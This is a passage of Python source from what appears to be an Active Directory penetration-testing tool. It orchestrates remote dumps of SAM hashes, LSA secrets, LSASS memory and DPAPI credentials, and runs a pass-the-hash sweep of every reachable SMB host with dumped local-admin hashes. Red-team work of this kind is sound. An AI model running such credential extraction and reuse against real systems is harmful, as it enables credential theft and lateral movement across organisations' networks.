            subtitle=f"[{_MUTED}]{total_pwned} Pwn3d combinations[/{_MUTED}]",
            border_style=title_color,
            padding=(0, 1),
        )
    )
    _CONSOLE.print(table)


async def _run_native_local_admin_reuse_check_async(
    shell: Any,
    domain: str,
    username: str,
    nt_hash: str,
    targets_file: str,
) -> None:
    """Native replacement for netexec --local-auth reuse check (single cred).

    Reads targets from ``targets_file``, runs SMBPrivilegeConfig checks in
    parallel, streams Pwn3d!/not-admin results live, and records attack steps.
    """
    hosts = _load_native_bulk_hosts(targets_file)
    if not hosts:
        print_warning("No SMB targets found for local admin reuse check.")
        return

    concurrency = _native_dump_concurrency("sam")  # 20 (auth-only, low overhead)
    creds = getattr(shell, "current_creds", None) or {}
    dc_ip = creds.get("dc_ip") or getattr(shell, "current_dc_ip", None) or ""

    _CONSOLE.print(
        f"\n[bold {_ICE}]◉  Local Admin Reuse[/bold {_ICE}]"
        f"  [{_MUTED}]{username}  ·  {len(hosts)} hosts[/{_MUTED}]\n"
    )

    # Pre-flight TCP probe: filter offline hosts before paying the auth cost.
    # Centralized via host_reachability_filter so every bulk-host caller (SAM
    # dumps, LSA dumps, RDP/WinRM sweeps) uses the same vocabulary and tuning.
    reach = await filter_reachable_hosts(hosts, port=445)
    print_reachability_summary(reach, service_label="SMB", console=_CONSOLE)
    if not reach.reachable:
        render_no_reachable_panel(
            reach, operation_label="Local Admin Reuse", console=_CONSOLE
        )
        return
    reachable_hosts = list(reach.reachable)
    offline_hosts = list(reach.offline)

    configs = [
        SMBPrivilegeConfig(
            target_ip=h,
            domain=".",  # local auth (".") means local machine
            username=username,
            nt_hash=nt_hash,
            auth_domain=domain,
            kdc_ip=dc_ip or h,
            timeout=10,
        )
        for h in reachable_hosts
    ]

    pwned_hosts: list[str] = []

    with Progress(
        SpinnerColumn(style=_ICE),
        BarColumn(bar_width=28, style=_MUTED, complete_style=_ICE),
        MofNCompleteColumn(),
        TextColumn("[{task.percentage:>3.0f}%]", style=_MUTED),
        TimeElapsedColumn(),
        console=_CONSOLE,
        transient=False,
    ) as prog:
        task_id = prog.add_task("", total=len(configs))
        results = await check_smb_privilege_batch(configs, max_concurrency=concurrency)
        for r in results:
            prog.advance(task_id)
            if r.status == SMBPrivilegeStatus.ADMIN:
                pwned_hosts.append(r.target_ip)
                _CONSOLE.print(
                    f"  [{_LAVA}]⚡  Pwn3d![/{_LAVA}]"
                    f"  [{_ACID}]{r.display_host}[/{_ACID}]"
                    f"  [{_MUTED}]local admin confirmed[/{_MUTED}]"
                )
            elif r.status == SMBPrivilegeStatus.NOT_ADMIN:
                _CONSOLE.print(
                    f"  [{_MUTED}]·   {r.display_host}  not admin[/{_MUTED}]"
                )

    _CONSOLE.print()
    n_pwned = len(pwned_hosts)
    if n_pwned:
        _CONSOLE.print(
            Panel(
                f"[bold {_LAVA}]  ⚡  Pwn3d on {n_pwned} host{'s' if n_pwned != 1 else ''}[/bold {_LAVA}]\n"
                f"[{_MUTED}]  user: {username}  ·  local admin reuse confirmed[/{_MUTED}]",
                title=f"[bold {_LAVA}]⚡  Local Admin Reuse Found[/bold {_LAVA}]",
                border_style=_LAVA,
                padding=(0, 1),
            )
        )
        # Record attack steps for each Pwn3d host
        for h in pwned_hosts:
            try:
                shell.add_credential(
                    domain,
                    username,
                    nt_hash,
                    h,
                    "smb",
                    verify_local_credential=False,
                    prompt_local_reuse_after=False,
                    ui_silent=True,
                    credential_origin="credential_reuse",
                )
            except Exception as exc:
                telemetry.capture_exception(exc)
    else:
        summary_lines = [
            f"[{_MUTED}]  {username} is not local admin on any reachable host.[/{_MUTED}]",
            (
                f"[{_MUTED}]  {len(reachable_hosts)} reachable"
                f"  ·  {len(offline_hosts)} offline (skipped)"
                f"  ·  {len(hosts)} total[/{_MUTED}]"
            ),
        ]
        _CONSOLE.print(
            Panel(
                "\n".join(summary_lines),
                title=f"[{_MUTED}]Local Admin Reuse[/{_MUTED}]",
                border_style=_MUTED,
                padding=(0, 1),
            )
        )


def _offer_native_local_admin_reuse(
    shell: Any,
    domain: str,
    admin_creds: list[Any],
) -> None:
    """After single-host SAM dump: offer native reuse check for admin creds."""
    from rich.prompt import Confirm as _RConfirm

    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
    targets_file, _ = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
    )
    if not targets_file:
        return

    n_hosts = len(_load_native_bulk_hosts(targets_file))
    if not n_hosts:
        return

    concurrency = _native_dump_concurrency("sam")
    est_s = max(n_hosts // concurrency, 1) * 3
    est_label = f"~{est_s // 60}m {est_s % 60}s" if est_s >= 60 else f"~{est_s}s"

    _CONSOLE.print(
        Panel(
            f"[{_ACID}]  {len(admin_creds)} local admin credential{'s' if len(admin_creds) != 1 else ''} found.[/{_ACID}]\n"
            f"[{_MUTED}]  Run reuse check against {n_hosts} hosts? ({est_label}, concurrency {concurrency})[/{_MUTED}]",
            title=f"[bold {_ICE}]◈  Local Admin Reuse Check[/bold {_ICE}]",
            border_style=_ICE,
            padding=(0, 1),
        )
    )

    if not _RConfirm.ask(f"  [{_ICE}]Proceed?[/{_ICE}]", default=True):
        return

    for cred in admin_creds:
        _run_native_async(
            _run_native_local_admin_reuse_check_async(
                shell, domain, cred.username, cred.nt_hash, targets_file
            )
        )


def _build_native_sam_reuse_candidates(
    *,
    credentials: list[Any],
    source_host: str,
) -> list[dict[str, Any]]:
    """Build SAM-derived reuse candidates for native single-host dumps."""
    candidates: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str]] = set()
    for cred in credentials:
        username = str(getattr(cred, "username", "") or "").strip()
        nt_hash = str(getattr(cred, "nt_hash", "") or "").strip()
        if not username or not nt_hash:
            continue
        if nt_hash.lower() == _EMPTY_NTLM_HASH:
            # Blank-password account: the empty-string NTLM hash is not a
            # usable credential, so it must never be offered as a reuse/spray
            # candidate.
            continue
        rid = str(getattr(cred, "rid", "-") or "-").strip() or "-"
        key = (username.casefold(), rid, nt_hash.lower())
        if key in seen:
            continue
        seen.add(key)
        candidates.append(
            {
                "username": username,
                "rid": rid,
                "source_hosts": 1,
                "source_hostnames": [source_host] if source_host else [],
                "credential": nt_hash,
                "credential_was_cracked": False,
            }
        )
    return candidates


def _native_execute_dump_sam(
    shell: Any,
    *,
    domain: str,
    host: str,
    auth_username: str | None,
) -> None:
    """Native SAM dump: hive download + SAMR admin tag + inline admin badges.

    After the dump, if admin credentials are found, offers a native reuse
    check (replaces netexec --local-auth) against all SMB targets.
    """
    display = DumpDisplay()
    workspace_dir = _native_workspace_dir(shell, domain)
    config = _build_smb_config_from_shell(shell, host, domain)
    svc = NativeDumpService()

    display.operation_header("SAM Dump", host=host, phases=4)
    display.phase_start(1, 4, "Building SMB connection")
    display.phase_start(2, 4, "Saving SAM + SYSTEM hives via remote registry")
    display.phase_start(3, 4, "Downloading hive files over SMB")
    display.phase_start(4, 4, "Parsing credentials  ·  tagging Administrators")

    try:
        result = _run_native_async(svc.dump_sam(config, workspace_dir=workspace_dir))
    except Exception as exc:
        telemetry.capture_exception(exc)
        display.phase_error(f"SAM dump failed: {exc}")
        return

    if not result.success:
        display.phase_error(result.error or "SAM dump failed")
        return

    if not result.credentials:
        display.no_credentials_found("SAM")
        return

    admin_creds: list[Any] = []
    counts: dict[CredentialType, int] = {CredentialType.SAM: 0}

    # Phase 1: display only (Live active, no console prints allowed).
    display.start_credential_stream("SAM Hashes  ·  [ADM] = local admin")
    try:
        for cred in result.credentials:
            account = f"{domain}\\{cred.username}" if domain else cred.username
            display.stream_credential(
                CredentialType.SAM,
                account,
                cred.nt_hash,
                extras=_sam_admin_extras(cred),
            )
            counts[CredentialType.SAM] += 1
            if (
                cred.is_local_admin
                and cred.nt_hash
                and cred.nt_hash.lower() != _EMPTY_NTLM_HASH
            ):
                admin_creds.append(cred)
    finally:
        display.stop_credential_stream()

    # Phase 2: persist (Live stopped, console is clean).
    source_steps = _build_dump_source_steps(
        domain=domain, dump_kind="SAM", host=host, auth_username=auth_username
    )
    add_kwargs: dict[str, Any] = {"source_steps": source_steps} if source_steps else {}
    # Tag every SAM-extracted local account so the Compromised Credentials views
    # attribute it to the SAM dump rather than rendering an empty method.
    add_kwargs["credential_origin"] = "sam_dump"
    for cred in result.credentials:
        nt_hash_clean = str(getattr(cred, "nt_hash", "") or "").strip().lower()
        if nt_hash_clean == _EMPTY_NTLM_HASH:
            # Blank-password accounts (Guest/DefaultAccount/WDAGUtilityAccount,
            # etc.) hash to the well-known empty-string NTLM value. It is not a
            # usable credential, so never store it. The display table still
            # shows it tagged as blank for situational awareness.
            print_info_debug(
                "[sam_dump] Skipping blank-password account "
                f"{mark_sensitive(cred.username, 'user')} on "
                f"{mark_sensitive(host, 'hostname')}: empty NTLM hash is "
                "not a usable credential."
            )
            continue
        try:
            shell.add_credential(
                domain,
                cred.username,
                cred.nt_hash,
                host,
                "smb",
                verify_local_credential=False,
                prompt_local_reuse_after=False,
                ui_silent=True,
                **add_kwargs,
            )
        except Exception as add_exc:
            telemetry.capture_exception(add_exc)
            print_warning(
                f"Could not persist credential for {cred.username}: {add_exc}"
            )

    display.summary(counts, sum(counts.values()), host, elapsed=0)

    # Offer native local admin reuse check for single-host dumps
    if admin_creds:
        _offer_native_local_admin_reuse(shell, domain, admin_creds)

    _run_optional_domain_account_reuse_validation(
        shell=shell,
        domain=domain,
        candidates=_resolve_reuse_candidate_credentials(
            shell=shell,
            candidates=_build_native_sam_reuse_candidates(
                credentials=list(result.credentials),
                source_host=host,
            ),
        ),
        source_scope="SAM dump (single host)",
        local_validation_results=[],
    )


def _native_execute_dump_lsa(
    shell: Any,
    *,
    domain: str,
    host: str,
    auth_username: str | None,
    include_machine_accounts: bool,
) -> None:
    """Native LSA dump fast-path using NativeDumpService + DumpDisplay."""
    display = DumpDisplay()
    workspace_dir = _native_workspace_dir(shell, domain)
    config = _build_smb_config_from_shell(shell, host, domain)
    svc = NativeDumpService()

    display.operation_header("LSA Dump", host=host, phases=4)
    display.phase_start(1, 4, "Building SMB connection")
    display.phase_start(2, 4, "Saving SECURITY + SYSTEM hives via remote registry")
    display.phase_start(3, 4, "Downloading hive files over SMB")
    display.phase_start(4, 4, "Parsing LSA secrets")

    try:
        result = _run_native_async(svc.dump_lsa(config, workspace_dir=workspace_dir))
    except Exception as exc:
        telemetry.capture_exception(exc)
        display.phase_error(f"LSA dump failed: {exc}")
        return

    if not result.success:
        display.phase_error(result.error or "LSA dump failed")
        return

    has_machine_hash = bool(result.machine_account_nt_hash)
    if not result.secrets and not has_machine_hash:
        display.no_credentials_found("LSA")
        return

    # Resolve DC short hostname for machine account naming and AES salt.
    # When host is an IP (e.g. "10.129.229.17"), host.split('.')[0] = "10" which
    # is meaningless. Prefer the pdc_hostname from domains_data; fall back to
    # stripping the domain label from an FQDN; last resort use the raw host value.
    import re as _re
    _is_ip = bool(_re.match(r"^\d+\.\d+\.\d+\.\d+$", host or ""))
    if _is_ip:
        _dc_short = (
            str(
                (shell.domains_data.get(domain) or {}).get("pdc_hostname") or host
            ).split(".")[0]
        )
    elif "." in host:
        _dc_short = host.split(".")[0]
    else:
        _dc_short = host

    counts: dict[CredentialType, int] = {CredentialType.LSA: 0}
    machine_user: str | None = None

    # Phase 1: display only (Live active, no console prints allowed).
    display.start_credential_stream("LSA Secrets")
    try:
        if has_machine_hash:
            machine_user = f"{_dc_short.upper()}$"
            display.stream_credential(
                CredentialType.LSA,
                f"{domain}\\{machine_user}" if domain else machine_user,
                result.machine_account_nt_hash or "",
                extras="machine account",
            )
            counts[CredentialType.LSA] += 1
        for secret in result.secrets:
            value = secret.plaintext or (secret.raw.hex() if secret.raw else "")
            display.stream_credential(
                CredentialType.LSA,
                secret.name,
                value,
                extras="LSA secret",
            )
            counts[CredentialType.LSA] += 1
    finally:
        display.stop_credential_stream()

    # Phase 2: persist machine account hash + AES keys.
    if include_machine_accounts and machine_user and result.machine_account_nt_hash:
        try:
            from adscan_internal.cli.machine_account_persist import (
                persist_machine_account_credential,
            )
            persist_machine_account_credential(
                shell,
                domain=domain,
                machine_account=machine_user,
                nt_hash=result.machine_account_nt_hash,
                kerberos_password=result.machine_account_kerberos_password,
                dc_hostname=_dc_short or None,
                source_steps=_build_dump_source_steps(
                    domain=domain,
                    dump_kind="LSA",
                    host=host,
                    auth_username=auth_username,
                    credential_username=machine_user,
                    secret=result.machine_account_nt_hash,
                ),
                skip_hash_cracking=True,
                verify_credential=False,
                prompt_for_user_privs_after=False,
                ensure_fresh_kerberos_ticket=False,
                ui_silent=True,
                credential_origin="lsa_secrets",
            )
        except Exception as add_exc:
            telemetry.capture_exception(add_exc)

    # Phase 3: persist service secrets (plaintext passwords from LSA).
    # These include DefaultPassword (attributed to the real user via Winlogon
    # query), service account credentials stored in LSA, and any other
    # non-internal LSA secrets with a recoverable plaintext value.
    _SKIP_LSA_NAMES = {"$MACHINE.ACC", "DPAPI_SYSTEM(machine)", "DPAPI_SYSTEM(user)"}
    for secret in result.secrets:
        if not secret.plaintext:
            continue
        if secret.name in _SKIP_LSA_NAMES:
            continue
        try:
            shell.add_credential(
                domain,
                secret.name,
                secret.plaintext,
                prompt_for_user_privs_after=True,
                credential_origin="lsa_secrets",
            )
        except Exception as svc_exc:
            telemetry.capture_exception(svc_exc)

    display.summary(counts, sum(counts.values()), host, elapsed=0)


def _native_execute_dump_lsass(
    shell: Any,
    *,
    domain: str,
    host: str,
) -> None:
    """Native LSASS dump fast-path using NativeDumpService + DumpDisplay."""
    display = DumpDisplay()
    workspace_dir = _native_workspace_dir(shell, domain)
    config = _build_smb_config_from_shell(shell, host, domain)
    svc = NativeDumpService()

    display.operation_header("LSASS Dump", host=host, phases=3)
    display.phase_start(1, 3, "Triggering remote LSASS minidump")
    display.phase_start(2, 3, "Streaming dump file over SMB")
    display.phase_start(3, 3, "Parsing credentials with pypykatz")

    try:
        result = _run_native_async(
            svc.dump_lsass(config, workspace_dir=workspace_dir, prefer_backend="auto")
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        display.phase_error(f"LSASS dump failed: {exc}")
        return

    if not result.success:
        display.phase_error(result.error or "LSASS dump failed")
        return

    if not result.credentials:
        display.no_credentials_found("LSASS")
        return

    counts: dict[CredentialType, int] = {CredentialType.LSASS: 0}

    # Phase 1: display only (Live active, no console prints allowed).
    display.start_credential_stream(f"LSASS Credentials (backend={result.backend})")
    try:
        for cred in result.credentials:
            account = (
                f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
            )
            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
            display.stream_credential(CredentialType.LSASS, account, secret)
            counts[CredentialType.LSASS] += 1
    finally:
        display.stop_credential_stream()

    display.summary(counts, sum(counts.values()), host, elapsed=0)

    # Phase 2: persist (Live stopped, verification + TGT panels render cleanly).
    _creds = getattr(shell, "current_creds", None) or {}
    auth_username: str | None = str(_creds.get("username") or "").strip() or None
    for cred in result.credentials:
        if cred.username and (cred.nt_hash or cred.lm_hash or cred.sha1):
            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
            try:
                shell.add_credential(
                    domain or cred.domain,
                    cred.username,
                    secret,
                    source_steps=_build_dump_source_steps(
                        domain=domain,
                        dump_kind="LSASS",
                        host=host,
                        auth_username=auth_username,
                        credential_username=cred.username,
                        secret=secret,
                        source_protocol="smb",
                    ),
                    skip_hash_cracking=False,
                    verify_credential=False,
                    prompt_for_user_privs_after=False,
                    ensure_fresh_kerberos_ticket=False,
                    ui_silent=True,
                    credential_origin="lsass_dump",
                )
            except Exception as add_exc:
                telemetry.capture_exception(add_exc)


def _native_execute_dump_dpapi(
    shell: Any,
    *,
    domain: str,
    host: str,
    auth_username: str | None,
) -> None:
    """Native DPAPI dump: auto-detecting DA and non-DA routes."""
    import tempfile
    from adscan_internal.services.exploitation.dump_display import DumpDisplay

    display = DumpDisplay()
    domains_data = getattr(shell, "domains_data", None) or {}
    pdc_ip = str(domains_data.get(domain, {}).get("pdc") or "").strip()
    pdc_hostname: str | None = (domains_data.get(domain) or {}).get("pdc_hostname")

    if not pdc_ip:
        print_error("DPAPI dump requires a known PDC. Run enumeration first.")
        return

    # --- Phase 1: DA detection from workspace ---
    known_da: bool | None = None
    get_admins = getattr(shell, "get_domain_admins", None)
    if callable(get_admins):
        try:
            da_list = get_admins(domain) or []
            creds = getattr(shell, "current_creds", None) or {}
            current_user = (creds.get("username") or "").lower()
            if current_user and da_list:
                known_da = current_user in [u.lower() for u in da_list]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)

    # Determine mode label for header (may be updated after live probe)
    mode_label = (
        "da" if known_da is True else ("non-da" if known_da is False else "unknown")
    )
    display.dpapi_operation_header(
        domain=mark_sensitive(domain, "domain"),
        target_host=mark_sensitive(host, "host"),
        mode=mode_label,
    )

    # Show mode line up front
    if known_da is None:
        display.dpapi_phase_done(1, 4, True, "Probing DC for DA status...")
    elif known_da:
        display.dpapi_phase_done(1, 4, True, "DA confirmed (workspace)")
    else:
        display.dpapi_phase_done(
            1,
            4,
            False,
            "Non-DA: switching to password + DPAPI_SYSTEM route",
        )

    config = _build_smb_config_from_shell(shell, host, domain)
    # ``_build_smb_config_from_shell`` already resolves the SPN FQDN into
    # ``target_hostname`` (from the workspace inventory) and anchors ``kdc_ip``
    # to the domain DC. Do NOT overwrite ``target_hostname`` with the raw IP —
    # that reintroduces the ``cifs/<ip>`` Kerberos failure this builder fixes.
    config.target_ip = host
    if pdc_ip:
        config.kdc_ip = pdc_ip

    display.dpapi_phase_done(2, 4, True, "Acquiring keys...")

    svc = DpapiNativeDumpService()
    with tempfile.TemporaryDirectory(prefix="adscan-dpapi-") as tmp:
        result: DpapiFullDumpResult = _run_native_async(
            svc.dump(
                config,
                target_host=host,
                domain=domain,
                workspace_dir=Path(tmp),
                known_da=known_da,
                pdc_ip=pdc_ip,
                pdc_hostname=pdc_hostname,
            )
        )

    total_mk = len(result.decrypted_masterkeys) + len(result.locked_masterkeys)
    dec_mk = len(result.decrypted_masterkeys)

    if result.mode == "non-da":
        text = (
            f"{dec_mk} masterkeys decrypted (password + DPAPI_SYSTEM)"
            if dec_mk
            else "0 masterkeys decrypted (no matching keys)"
        )
        display.dpapi_phase_done(3, 4, dec_mk > 0, text)
    else:
        text = (
            f"{dec_mk} masterkeys decrypted via backup key"
            if dec_mk
            else "0 masterkeys decrypted"
        )
        display.dpapi_phase_done(3, 4, dec_mk > 0, text)

    n_creds = len(result.credentials)
    display.dpapi_phase_done(
        4, 4, True, "Looting Credential Manager + Vault + Browsers"
    )

    # --- Classify + verify candidates against the domain ---
    from adscan_internal.services.exploitation.dpapi_credential_processor import (
        process_dpapi_credentials,
    )

    ad_users = _load_dpapi_ad_users(shell, domain)
    enriched = _run_native_async(
        process_dpapi_credentials(
            result.credentials,
            domain=domain,
            pdc_ip=pdc_ip,
            domains_data=domains_data,
            ad_users=ad_users,
        )
    )

    # Display: full provenance table if we have credentials, summary otherwise.
    if enriched:
        display.dpapi_provenance_table(enriched)
    else:
        display.no_credentials_found("DPAPI")

    pvk_preview = result.backup_key_pvk[:4].hex() if result.backup_key_pvk else None
    display.dpapi_footer(
        decrypted=dec_mk,
        total_masterkeys=total_mk,
        cred_count=n_creds,
        mode=result.mode,
        elapsed=result.elapsed_seconds,
        backup_key_preview=pvk_preview,
    )

    if result.errors:
        for err in result.errors:
            print_warning(f"DPAPI: {err}")

    # --- Workspace persistence ---
    _persist_dpapi_result(shell, result, enriched=enriched, domain=domain, host=host)


def execute_dump_lsa(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
    include_machine_accounts: bool = True,
) -> None:
    """Execute an LSA dump through the native async SMB stack only."""
    _ = command
    try:
        if not _native_dump_supported(shell, host):
            print_error(
                "Native LSA dump cannot start because no usable native SMB credential "
                "context is available. external-command fallback has been removed."
            )
            return
        _native_execute_dump_lsa(
            shell,
            domain=domain,
            host=host,
            auth_username=auth_username,
            include_machine_accounts=include_machine_accounts,
        )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during native LSA dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_sam(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
) -> None:
    """Execute a SAM dump through the native async SMB stack only."""
    _ = command
    try:
        if not _native_dump_supported(shell, host):
            print_error(
                "Native SAM dump cannot start because no usable native SMB credential "
                "context is available. external-command fallback has been removed."
            )
            return
        _native_execute_dump_sam(
            shell,
            domain=domain,
            host=host,
            auth_username=auth_username,
        )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during native SAM dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_dpapi(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
) -> None:
    """Execute a DPAPI dump through the native async SMB stack only."""
    _ = (command, auth_username)
    try:
        if not _native_dump_supported(shell, host):
            print_error(
                "Native DPAPI dump cannot start because no usable native SMB credential "
                "context is available. external-command fallback has been removed."
            )
            return
        _native_execute_dump_dpapi(
            shell,
            domain=domain,
            host=host,
            auth_username=auth_username,
        )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during native DPAPI dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_lsass(shell: Any, command: str, domain: str, host: str) -> None:
    """Execute an LSASS dump through the native async SMB stack only."""
    _ = command
    try:
        if not _native_dump_supported(shell, host):
            print_error(
                "Native LSASS dump cannot start because no usable native SMB credential "
                "context is available. Legacy LSASS fallback has been removed."
            )
            return
        _native_execute_dump_lsass(
            shell,
            domain=domain,
            host=host,
        )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during native LSASS dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_rest(shell: Any, command: str, domain: str, host: str) -> None:
    """Reject generic subprocess dump execution after native migration."""
    _ = (shell, command, domain, host)
    print_error(
        "Generic subprocess dump execution has been removed. "
        "Use the native SAM, LSA, DPAPI, or LSASS dump paths."
    )


# ============================================================================
# CLI Command Handlers (ask_for_* and do_* functions)
# ============================================================================


def run_ask_for_dump_host(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Prompt user to dump credentials from remote host(s)."""
    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    cred_type = "Local Admin" if islocal else "Domain Admin"
    host_display = (
        host
        if isinstance(host, str)
        else f"{len(host)} hosts"
        if isinstance(host, list)
        else "target host(s)"
    )

    if confirm_operation(
        operation_name="Remote Credential Extraction",
        description="Extracts credentials from SAM, LSA Secrets, DPAPI, and LSASS memory dumps",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Target Host(s)": host_display,
            "Username": username,
            "Credential Type": cred_type,
            "Sources": "SAM, LSA, DPAPI, LSASS",
        },
        default=True,
        icon="💾",
        show_panel=True,
    ):
        run_dump_host(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            islocal=islocal,
        )


def run_dump_host(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Professional credential dumping with progress tracking."""
    cred_type = "Hash" if shell.is_hash(password) else "Password"
    auth_scope = "Local" if islocal.lower() == "true" else "Domain"

    # --- Premium session header ---
    try:
        _dh_domain = str(domain or "")
        _domains_data = getattr(shell, "domains_data", {}) or {}
        _domain_info = (
            _domains_data.get(_dh_domain, {}) if isinstance(_domains_data, dict) else {}
        ) or {}
        _dh_dc = str(_domain_info.get("pdc", "") or "")
        _dh_user = str(username or "")
        _dh_cred = (
            f"{_dh_user} / {_dh_domain.upper()}"
            if _dh_user and _dh_domain
            else _dh_user
        )
        print_session_header(
            SessionHeader(
                workspace=str(getattr(shell, "current_workspace", "") or ""),
                target_domain=_dh_domain,
                dc_ip=_dh_dc,
                credential_label=_dh_cred,
                scan_mode="dumps",
            )
        )
    except Exception:  # noqa: BLE001 - cosmetic header must never block dump
        pass

    # Initialize progress tracker for credential dumping
    tracker = ScanProgressTracker(
        "Host Credential Extraction",
        total_steps=4,
    )

    # Start workflow with detailed information
    tracker.start(
        details={
            "Domain": domain,
            "Target Host": host,
            "Username": username,
            "Credential Type": cred_type,
            "Authentication Scope": auth_scope,
        }
    )

    # Step 1: SAM Database Dump
    tracker.start_step("SAM Database Dump", details="Extracting local account hashes")
    try:
        run_dump_sam(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="SAM extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"SAM dump error: {str(e)[:50]}")

    # Step 2: LSA Secrets Dump
    tracker.start_step("LSA Secrets Dump", details="Extracting cached credentials")
    try:
        run_dump_lsa(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="LSA extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"LSA dump error: {str(e)[:50]}")

    # Step 3: DPAPI Credentials
    tracker.start_step("DPAPI Credential Dump", details="Extracting DPAPI master keys")
    try:
        run_dump_dpapi(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="DPAPI extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"DPAPI dump error: {str(e)[:50]}")

    # Step 4: LSASS Process Dump
    tracker.start_step(
        "LSASS Memory Dump", details="Extracting credentials from memory"
    )
    try:
        if _is_bulk_dump_target(host):
            tracker.complete_step(
                details="LSASS skipped (multi-host target not supported)"
            )
        else:
            run_ask_for_dump_lsass(
                shell,
                domain=domain,
                username=username,
                password=password,
                host=host,
                islocal=islocal,
            )
            tracker.complete_step(details="LSASS dump completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"LSASS dump error: {str(e)[:50]}")

    # Print workflow summary
    tracker.print_summary()

    # --- End-of-run loot card ---
    try:
        _loot_domain = str(domain or getattr(shell, "current_domain", "") or "")
        _domains_data = getattr(shell, "domains_data", {}) or {}
        _domain_info = (
            _domains_data.get(_loot_domain, {})
            if isinstance(_domains_data, dict)
            else {}
        ) or {}
        _owned = list(_domain_info.get("owned_accounts", []) or [])
        print_session_loot_card(
            SessionLootCard(
                domain=_loot_domain,
                owned_accounts=_owned,
            )
        )
    except Exception:  # noqa: BLE001 - loot card is cosmetic, never block exit
        pass


def run_do_dump_host(shell: Any, args: str) -> None:
    """
    Dumps the credentials of a host.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - host (str): The target host.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    The function dumps the LSA, DPAPI and asks for LSASS credentials of the target host.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_instruction(
            "Usage: dump_host <domain> <host> <username> <password> <islocal>"
        )
        return

    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    islocal = args_list[4]

    run_dump_host(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        islocal=islocal,
    )


def run_ask_for_dump_registries(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump registry hives from Domain Controller."""
    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

    if confirm_operation(
        operation_name="Remote Registry Dump",
        description="Extracts Windows Registry hives from the Primary Domain Controller",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Username": username,
            "Target Hives": "SAM, SECURITY, SYSTEM",
            "Output Location": f"\\\\{shell.myip}\\smbFolder"
            if shell.myip
            else "SMB Share",
        },
        default=True,
        icon="📋",
    ):
        run_dump_registries(
            shell,
            domain=domain,
            username=username,
            password=password,
        )


def run_do_dump_registries(shell: Any, args: str) -> None:
    """
    Dumps the registries of a domain.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.

    The function dumps the registries of the target PDC using the specified
    username and password for authentication.
    """
    args_list = args.split()
    if len(args_list) != 3:
        print_error("Usage: dump_registries <domain> <username> <password>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    run_dump_registries(
        shell,
        domain=domain,
        username=username,
        password=password,
    )


def run_ask_for_dump_all_lsa(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump LSA credentials from all hosts in domain.

    Renders the OPSEC disclosure panel first so the operator sees the
    telemetry footprint before the confirmation prompt.
    """
    marked_domain = mark_sensitive(domain, "domain")
    _render_opsec_panel(
        "lsa",
        target_label=f"All hosts in [bold]{marked_domain}[/bold]",
    )
    if Confirm.ask(
        f"  [{_AMBER}]Proceed with LSA bulk dump across {marked_domain}?[/{_AMBER}]",
        default=False,
    ):
        run_dump_lsa(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )
    else:
        _CONSOLE.print(
            f"  [{_MUTED}]LSA bulk dump aborted at the OPSEC gate.[/{_MUTED}]"
        )


def run_ask_for_dump_all_sam(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump SAM credentials from all hosts in domain.

    Renders the OPSEC disclosure panel first so the operator sees the
    telemetry footprint before the confirmation prompt.
    """
    marked_domain = mark_sensitive(domain, "domain")
    _render_opsec_panel(
        "sam",
        target_label=f"All hosts in [bold]{marked_domain}[/bold]",
    )
    if Confirm.ask(
